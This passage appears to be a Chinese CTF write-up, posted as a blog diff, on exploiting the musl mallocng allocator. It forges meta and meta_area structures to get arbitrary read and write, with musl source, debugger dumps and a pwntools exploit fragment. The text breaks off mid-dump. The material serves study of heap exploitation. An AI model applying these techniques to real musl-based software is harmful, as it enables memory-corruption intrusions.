+<p>所以我们可以进行任意地址读。将__malloc_context 的地址写在 note 的位置，就可以泄露，同时我们还可以改变 notesize, 控制泄露的长度。</p>
+<p>由于 musl 的堆管理机制，虽然与 glibc 完全不一样，但是感觉通过代码分析是更容易的。</p>
+<h3 id="任意地址写"><a class="markdownIt-Anchor" href="#任意地址写">#</a> 任意地址写</h3>
+<p>musl 的任意地址写与 glibc 的 unlink 核心想法一致，只不过是前面的检查方式不一样。我们一步步来分析。</p>
+<p>首先 musl 的堆块不会进入 bins，只有 meta 被释放的时候，才会加入 freed_meta 双链表。当 meta 分配出去的 slot 全部被释放的时候，meta 会被释放。</p>
+<h4 id="meta的-结构"><a class="markdownIt-Anchor" href="#meta的-结构">#</a> meta 的 结构</h4>
+<p>meta 结构一共占用 40bytes</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> meta*)<span class="number">0x55555730d4f0</span></span><br><span class="line">$<span class="number">3</span> = &#123;</span><br><span class="line">  prev = <span class="number">0x55555730d4f0</span>, </span><br><span class="line">  next = <span class="number">0x55555730d4f0</span>, </span><br><span class="line">  mem = <span class="number">0x7f6431216c30</span>, </span><br><span class="line">  avail_mask = <span class="number">262</span>, </span><br><span class="line">  freed_mask = <span class="number">0</span>, </span><br><span class="line">  last_idx = <span class="number">9</span>, </span><br><span class="line">  freeable = <span class="number">1</span>, </span><br><span class="line">  sizeclass = <span class="number">2</span>, </span><br><span class="line">  maplen = <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pwndbg&gt; x/8gx 0x55555730d4f0</span></span><br><span class="line"><span class="comment">0x55555730d4f0:	0x000055555730d4f0	0x000055555730d4f0</span></span><br><span class="line"><span class="comment">0x55555730d500:	0x00007f6431216c30	0x0000000000000106</span></span><br><span class="line"><span class="comment">0x55555730d510:	0x00000000000000a9</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>prev 与 next 分别指向上一个或者下一个 meta（meta 在 freed_meta 链表中）。mem 指向管理 meta 的 group，而 group 又包含的一下简单信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> group*)<span class="number">0x55555730d4f0</span></span><br><span class="line">$<span class="number">2</span> = &#123;</span><br><span class="line">  meta = <span class="number">0x55555730d4f0</span>, </span><br><span class="line">  active_idx = <span class="number">16</span> <span class="string">&#x27;\020&#x27;</span>, </span><br><span class="line">  pad = <span class="string">&quot;\324\060WUU\000&quot;</span>, </span><br><span class="line">  storage = <span class="number">0x55555730d500</span> <span class="string">&quot;0l!1d\177&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>其中很多信息我们不需要管信息，只要知道用户的使用的 slot 数据在 storage 里面。这里提一下，group 其实也可以看作是一个 slot，被另一个 “meta” 管理，这里提到这个是因为，free meta 的时候，除了会释放对应的 slot，还要释放对应的 group。slot 的储存结构也比较有意思，他并不会像 glibc 的 chunk 那样保留过多的本 slot 信息，只会用四字节来保留 slot 与 meta 的关系。</p>
+<p><img data-src="C:%5CUsers%5C32644%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20220422192430250.png" alt="image-20220422192430250"></p>
+<p>1 这里是用户使用的区域，2 是 group 的信息，包括 meta</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(<span class="keyword">struct</span> group*)<span class="number">0x7f6431216c30</span></span><br><span class="line">$<span class="number">4</span> = &#123;</span><br><span class="line">  meta = <span class="number">0x55555730d4f0</span>, </span><br><span class="line">  active_idx = <span class="number">9</span> <span class="string">&#x27;\t&#x27;</span>, </span><br><span class="line">  pad = <span class="string">&quot;\000\000\000\000\200\000&quot;</span>, </span><br><span class="line">  storage = <span class="number">0x7f6431216c40</span> <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>然后，3 这，他也只想一个地址，这里你也是一个 meta，与后面 group 的 free 有关。</p>
+<p>slot 的堆头会保留与 base 的偏移，以及 slot 在 group 组的编号，通过偏移找到 base，也就是 group 的地址。</p>
+<p>下面我们来说检查，要想把 fake_meta 释放掉，要保证 meta 只有一个 freeadble, 可以是只有 1 个 slot，也可以是其他状况，因为这个会涉及 meta 的 avail_mask 以及 freed_mask，我建议是把 freed_mask 写成 0，这样在 free 函数里的一个循环时，直接跳出，减少工作量。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// atomic free without locking if this is neither first or last slot</span></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">	<span class="type">uint32_t</span> freed = g-&gt;freed_mask;</span><br><span class="line">	<span class="type">uint32_t</span> avail = g-&gt;avail_mask;</span><br><span class="line">	<span class="type">uint32_t</span> mask = freed | avail;</span><br><span class="line">	assert(!(mask&amp;self));</span><br><span class="line">	<span class="keyword">if</span> (!freed || mask+self==all) <span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">if</span> (!MT)</span><br><span class="line">		g-&gt;freed_mask = freed+self;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;freed_mask, freed, freed+self)!=freed)</span><br><span class="line">		<span class="keyword">continue</span>;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>上面提到的根据用户指针找到对应的 meta，在 free 函数里被封装在 get_meta () 函数里，这里也是我们的第一个检查。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> meta *<span class="title function_">get_meta</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">	assert(!((<span class="type">uintptr_t</span>)p &amp; <span class="number">15</span>));</span><br><span class="line">	<span class="type">int</span> offset = *(<span class="type">const</span> <span class="type">uint16_t</span> *)(p - <span class="number">2</span>);</span><br><span class="line">	<span class="type">int</span> index = get_slot_index(p);</span><br><span class="line">	<span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">		assert(!offset);</span><br><span class="line">		offset = *(<span class="type">uint32_t</span> *)(p - <span class="number">8</span>);</span><br><span class="line">		assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="type">const</span> <span class="type">void</span> *)(p - UNIT*offset - UNIT);						<span class="comment">//UNIT = 16</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span> =</span> base-&gt;meta;</span><br><span class="line">	assert(meta-&gt;mem == base);</span><br><span class="line">	assert(index &lt;= meta-&gt;last_idx);</span><br><span class="line">	assert(!(meta-&gt;avail_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">	assert(!(meta-&gt;freed_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">area</span> =</span> (<span class="type">void</span> *)((<span class="type">uintptr_t</span>)meta &amp; <span class="number">-4096</span>);</span><br><span class="line">	assert(area-&gt;check == ctx.secret);</span><br><span class="line">	<span class="keyword">if</span> (meta-&gt;sizeclass &lt; <span class="number">48</span>) &#123;</span><br><span class="line">		assert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);</span><br><span class="line">		assert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+<span class="number">1</span>));</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		assert(meta-&gt;sizeclass == <span class="number">63</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (meta-&gt;maplen) &#123;</span><br><span class="line">		assert(offset &lt;= meta-&gt;maplen*<span class="number">4096UL</span>/UNIT - <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">struct</span> meta *)meta;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>一些 offset，idx 的设置其实有相关的计算方式，但是为了方便，我们伪造的之前，可以把利用程序做一个真实的对布局，然后直接把 group，meta 的结构体中的使用位的参数复制出来。这样就可以很方便的跳过检查。我们将 fake 伪造在一个大的堆块上，fake 会根据 const struct meta *meta = base-&gt;meta; 来查询到，下面我们还要伪造一个 meta_area 结构体，这个结构体保留了__malloc_context 的 secret，然后这个 area 是 0x1000 字节对齐的，const struct meta_area *area = (void *)((uintptr_t) meta &amp; -4096);，这个跟我们的 fake_meta 的地址是相关联的，所以我们需要在一个 0x1000 字节对齐的地方布置一个 fake_meta_area, 主要就是把 secret 写进去，绕过检查。这里并不会检查 meta 的 prev 以及 next 是否合法，所以这里有一个任意地址的写。把 prev 地址 + 8 写为 next 的值。释放 slot 的检查基本就结束，因为我们伪造的 slot 的头，以及 fake_meta 都是真实的样子，然后还有一个关键的检查是在 dequeue (unlink) 之后 free_group，这里会将 group 指针作为一个 slot 指针，进行 free。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">nontrivial_free</span><span class="params">(<span class="keyword">struct</span> meta *g, <span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line">	<span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line">	<span class="type">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">		<span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line">		<span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line">		<span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">			assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">			<span class="type">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">			dequeue(&amp;ctx.active[sc], g);					<span class="comment">//任意地址写</span></span><br><span class="line">			<span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">				activate_group(ctx.active[sc]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> free_group(g);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">		assert(sc &lt; <span class="number">48</span>);</span><br><span class="line">		<span class="comment">// might still be active if there were no allocations</span></span><br><span class="line">		<span class="comment">// after last available slot was taken.</span></span><br><span class="line">		<span class="keyword">if</span> (ctx.active[sc] != g) &#123;</span><br><span class="line">			<span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">dequeue</span><span class="params">(<span class="keyword">struct</span> meta **phead, <span class="keyword">struct</span> meta *m)</span>				<span class="comment">//unlink the meta</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (m-&gt;next != m) &#123;							<span class="comment">//meta is freed</span></span><br><span class="line">		m-&gt;prev-&gt;next = m-&gt;next;</span><br><span class="line">		m-&gt;next-&gt;prev = m-&gt;prev;</span><br><span class="line">		<span class="keyword">if</span> (*phead == m) *phead = m-&gt;next;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		*phead = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	m-&gt;prev = m-&gt;next = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>就是我们上面图片的 3 号位置。这个是 group 对应的 meta, 这里利用同样的手段伪造一个 fake_meta_area 以及一个 meta, 只需要在另外一个 0x1000 字节对齐的空间布置下 secret，后面布置 fake_meta2 就可以了。因为这里的检查也主要是 get_meta (). 最后 free_meta ()</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">free_meta</span><span class="params">(<span class="keyword">struct</span> meta *m)</span></span><br><span class="line">&#123;</span><br><span class="line">	*m = (<span class="keyword">struct</span> meta)&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="built_in">queue</span>(&amp;ctx.free_meta_head, m);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">queue</span><span class="params">(<span class="keyword">struct</span> meta **phead, <span class="keyword">struct</span> meta *m)</span>						</span><br><span class="line">    <span class="comment">//inser m in the front of queue,but it will not change the phead ptr </span></span><br><span class="line">&#123;</span><br><span class="line">	assert(!m-&gt;next);</span><br><span class="line">	assert(!m-&gt;prev);</span><br><span class="line">	<span class="keyword">if</span> (*phead) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">head</span> =</span> *phead;</span><br><span class="line">		m-&gt;next = head;</span><br><span class="line">		m-&gt;prev = head-&gt;prev;</span><br><span class="line">		m-&gt;next-&gt;prev = m-&gt;prev-&gt;next = m;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		m-&gt;prev = m-&gt;next = m;</span><br><span class="line">		*phead = m;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>没有什么其他检查。</p>
+<h4 id="利用-2"><a class="markdownIt-Anchor" href="#利用-2">#</a> 利用</h4>
+<p>回到题目，我们利用 UAF,</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">b&#x27;g&#x27;</span>*<span class="number">0x28</span>,<span class="string">b&#x27;g&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">add(<span class="string">b&#x27;h&#x27;</span>*<span class="number">0x28</span>,<span class="string">b&#x27;h&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line">fakebabynote = p64( <span class="number">0x29fdd0</span> +libcbase)+p64(fakemeta_addr+<span class="number">0x50</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x28</span>)+p64(<span class="number">0</span>)</span><br><span class="line">add(<span class="string">b&#x27;i&#x27;</span>,fakebabynote)</span><br><span class="line">free(<span class="string">b&#x27;g&#x27;</span>*<span class="number">0x28</span>)</span><br><span class="line">gdb.attach(r)</span><br><span class="line">add(p64(<span class="number">0x29bd00</span>+libcbase)*<span class="number">2</span>+p64(<span class="number">0x8</span>)+p64(<span class="number">0x8</span>)+p64(libcbase+<span class="number">0x29bd90</span>),fake_meta.ljust(<span class="number">0x2000</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">free(<span class="string">b&#x27;b&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>group 里的第一个 slot 开始被用作存放 banynote1，next 指针指向 0，babynotelist 头插法之后删掉第一个创建的 babynote，然后堆风水将 slot0（原本作为 babynote）作为 name 或者 note 堆块，可以写入数据，但是因为存在 uaf, 虽然 slot0 作为链表头的 name 或者 note, 但是依旧可以链表的遍历将他看成一个节点，我们还可以将其 next 指针写为我们 kafechunk 的地址，这个 fakechunk 其实是一个 babynote 的 name 或者 note，只是伪造成了 bebynote 的布局，对应 note 之指针指向我们布局好的 fakeslot</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">pwndbg&gt; x/<span class="number">64</span>gx  <span class="number">0x7f22b639fc30</span></span><br><span class="line"><span class="number">0x7f22b639fc30</span>:	<span class="number">0x00005555569254f0</span>	<span class="number">0x0000ff0000000009</span></span><br><span class="line"><span class="number">0x7f22b639fc40</span>:	<span class="number">0x00007f22b639fc70</span>	<span class="number">0x00007f22b639fca0</span></span><br><span class="line"><span class="number">0x7f22b639fc50</span>:	<span class="number">0x0000000000000028</span>	<span class="number">0x0000000000000028</span></span><br><span class="line"><span class="number">0x7f22b639fc60</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000ff0000000000</span>				<span class="comment">//下一次申请，这里会被改写</span></span><br><span class="line"><span class="number">0x7f22b639fc70</span>:	<span class="number">0x6767676767676767</span>	<span class="number">0x6767676767676767</span></span><br><span class="line"><span class="number">0x7f22b639fc80</span>:	<span class="number">0x6767676767676767</span>	<span class="number">0x6767676767676767</span></span><br><span class="line"><span class="number">0x7f22b639fc90</span>:	<span class="number">0x6767676767676767</span>	<span class="number">0x0000ff0000000000</span></span><br><span class="line"><span class="number">0x7f22b639fca0</span>:	<span class="number">0x6767676767676767</span>	<span class="number">0x6767676767676767</span></span><br><span class="line"><span class="number">0x7f22b639fcb0</span>:	<span class="number">0x6767676767676767</span>	<span class="number">0x6767676767676767</span></span><br><span class="line"><span class="number">0x7f22b639fcc0</span>:	<span class="number">0x6767676767676767</span>	<span class="number">0x0009830000000000</span></span><br><span class="line"><span class="number">0x7f22b639fcd0</span>:	<span class="number">0x00007f22b639fd00</span>	<span class="number">0x00007f22b639fd30</span></span><br><span class="line"><span class="number">0x7f22b639fce0</span>:	<span class="number">0x0000000000000028</span>	<span class="number">0x0000000000000028</span></span><br><span class="line"><span class="number">0x7f22b639fcf0</span>:	<span class="number">0x00007f22b639fc40</span>	<span class="number">0x000c840000000000</span></span><br><span class="line"><span class="number">0x7f22b639fd00</span>:	<span class="number">0x6868686868686868</span>	<span class="number">0x6868686868686868</span></span><br><span class="line"><span class="number">0x7f22b639fd10</span>:	<span class="number">0x6868686868686868</span>	<span class="number">0x6868686868686868</span></span><br><span class="line"><span class="number">0x7f22b639fd20</span>:	<span class="number">0x6868686868686868</span>	<span class="number">0x000f850000000000</span></span><br><span class="line"><span class="number">0x7f22b639fd30</span>:	<span class="number">0x6868686868686868</span>	<span class="number">0x6868686868686868</span></span><br><span class="line"><span class="number">0x7f22b639fd40</span>:	<span class="number">0x6868686868686868</span>	<span class="number">0x6868686868686868</span></span><br><span class="line"><span class="number">0x7f22b639fd50</span>:	<span class="number">0x6868686868686868</span>	<span class="number">0x0012860000000000</span></span><br><span class="line"><span class="number">0x7f22b639fd60</span>:	<span class="number">0x00007f22b63a3e20</span>	<span class="number">0x00007f22b639fd90</span><span class="comment">//fakebabynote的地址</span></span><br><span class="line"><span class="number">0x7f22b639fd70</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x0000000000000028</span></span><br><span class="line"><span class="number">0x7f22b639fd80</span>:	<span class="number">0x00007f22b639fcd0</span>	<span class="number">0x0015870000000000</span></span><br><span class="line"><span class="number">0x7f22b639fd90</span>:	<span class="number">0x00007f22b63a3dd0</span>	<span class="number">0x00007f22b6395070</span>		<span class="comment">//fakebabynote,0x00007f22b6395070指向我们伪造的slot</span></span><br><span class="line"><span class="number">0x7f22b639fda0</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x0000000000000028</span></span><br><span class="line"><span class="number">0x7f22b639fdb0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000ff0000000000</span></span><br><span class="line"><span class="number">0x7f22b639fdc0</span>:	<span class="number">0x6767676767676767</span>	<span class="number">0x6767676767676767</span></span><br><span class="line"><span class="number">0x7f22b639fdd0</span>:	<span class="number">0x6767676767676767</span>	<span class="number">0x6767676767676767</span></span><br><span class="line"><span class="number">0x7f22b639fde0</span>:	<span class="number">0x6767676767676767</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7f22b639fdf0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7f22b639fe00</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7f22b639fe10</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7f22b639fe20</span>:	<span class="number">0x0000555556925090</span>	<span class="number">0x0000ff0000000000</span></span><br><span class="line"></span><br><span class="line">    </span><br></pre></td></tr></table></figure>
+<p>我们把 slot 申请成为 name 后</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">64</span>gx  <span class="number">0x7f22b639fc30</span></span><br><span class="line"><span class="number">0x7f22b639fc30</span>:	<span class="number">0x00005555569254f0</span>	<span class="number">0x0000800000000009</span></span><br><span class="line"><span class="number">0x7f22b639fc40</span>:	<span class="number">0x00007f22b639fd00</span>	<span class="number">0x00007f22b639fd00</span></span><br><span class="line"><span class="number">0x7f22b639fc50</span>:	<span class="number">0x0000000000000008</span>	<span class="number">0x0000000000000008</span></span><br><span class="line"><span class="number">0x7f22b639fc60</span>:	<span class="number">0x00007f22b639fd90</span>	<span class="number">0x0000ff0000000000</span></span><br><span class="line"><span class="number">0x7f22b639fc70</span>:	<span class="number">0x6767676767676767</span>	<span class="number">0x6767676767676767</span></span><br><span class="line"><span class="number">0x7f22b639fc80</span>:	<span class="number">0x6767676767676767</span>	<span class="number">0x6767676767676767</span></span><br><span class="line"><span class="number">0x7f22b639fc90</span>:	<span class="number">0x6767676767676767</span>	<span class="number">0x0000ff0000000000</span></span><br><span class="line"><span class="number">0x7f22b639fca0</span>:	<span class="number">0x6767676767676767</span>	<span class="number">0x6767676767676767</span></span><br><span class="line"><span class="number">0x7f22b639fcb0</span>:	<span class="number">0x6767676767676767</span>	<span class="number">0x6767676767676767</span></span><br><span class="line"><span class="number">0x7f22b639fcc0</span>:	<span class="number">0x6767676767676767</span>	<span class="number">0x0009830000000000</span></span><br><span class="line"><span class="number">0x7f22b639fcd0</span>:	<span class="number">0x00007f22b639fd00</span>	<span class="number">0x00007f22b639fd30</span></span><br><span class="line"><span class="number">0x7f22b639fce0</span>:	<span class="number">0x0000000000000028</span>	<span class="number">0x0000000000000028</span></span><br><span class="line"><span class="number">0x7f22b639fcf0</span>:	<span class="number">0x00007f22b639fc40</span>	<span class="number">0x000c840000000000</span></span><br><span class="line"><span class="number">0x7f22b639fd00</span>:	<span class="number">0x6868686868686868</span>	<span class="number">0x6868686868686868</span></span><br><span class="line"><span class="number">0x7f22b639fd10</span>:	<span class="number">0x6868686868686868</span>	<span class="number">0x6868686868686868</span></span><br><span class="line"><span class="number">0x7f22b639fd20</span>:	<span class="number">0x6868686868686868</span>	<span class="number">0x000f850000000000</span></span><br><span class="line"><span class="number">0x7f22b639fd30</span>:	<span class="number">0x6868686868686868</span>	<span class="number">0x6868686868686868</span></span><br><span class="line"><span class="number">0x7f22b639fd40</span>:	<span class="number">0x6868686868686868</span>	<span class="number">0x6868686868686868</span></span><br><span class="line"><span class="number">0x7f22b639fd50</span>:	<span class="number">0x6868686868686868</span>	<span class="number">0x0012860000000000</span></span><br><span class="line"><span class="number">0x7f22b639fd60</span>:	<span class="number">0x00007f22b63a3e20</span>	<span class="number">0x00007f22b639fd90</span></span><br><span class="line"><span class="number">0x7f22b639fd70</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x0000000000000028</span></span><br><span class="line"><span class="number">0x7f22b639fd80</span>:	<span class="number">0x00007f22b639fcd0</span>	<span class="number">0x0015870000000000</span></span><br><span class="line"><span class="number">0x7f22b639fd90</span>:	<span class="number">0x00007f22b63a3dd0</span>	<span class="number">0x00007f22b6395070</span></span><br><span class="line"><span class="number">0x7f22b639fda0</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x0000000000000028</span></span><br><span class="line"><span class="number">0x7f22b639fdb0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000ff0000000000</span></span><br><span class="line"><span class="number">0x7f22b639fdc0</span>:	<span class="number">0x6767676767676767</span>	<span class="number">0x6767676767676767</span></span><br><span class="line"><span class="number">0x7f22b639fdd0</span>:	<span class="number">0x6767676767676767</span>	<span class="number">0x6767676767676767</span></span><br><span class="line"><span class="number">0x7f22b639fde0</span>:	<span class="number">0x6767676767676767</span>	<span class="number">0x001b890000000000</span></span><br><span class="line"><span class="number">0x7f22b639fdf0</span>:	<span class="number">0x00007f22b639fc40</span>	<span class="number">0x00007f22b6394020</span>	<span class="comment">//babynotelist的头指针，</span></span><br><span class="line"><span class="number">0x7f22b639fe00</span>:	<span class="number">0x0000000000000028</span>	<span 